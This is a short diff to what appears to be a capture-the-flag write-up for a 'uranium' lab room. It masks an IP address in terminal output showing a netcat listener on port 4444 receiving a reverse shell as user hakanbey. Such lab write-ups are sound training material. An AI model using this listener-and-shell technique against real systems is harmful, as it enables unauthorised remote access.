@@ -195,7 +195,7 @@ Wait for 1 minute and BOOM we got Shell
 ```
 root@ubuntu:~/THM/uranum# nc -nlvp 4444
 listening on [any] 4444 ...
-connect to [10.8.221.36] from (UNKNOWN) [10.10.xx.xx] 58774
+connect to [10.8.xx.xx] from (UNKNOWN) [10.10.xx.xx] 58774
 bash: cannot set terminal process group (1898): Inappropriate ioctl for device
 bash: no job control in this shell
 hakanbey@uranium:~$ 
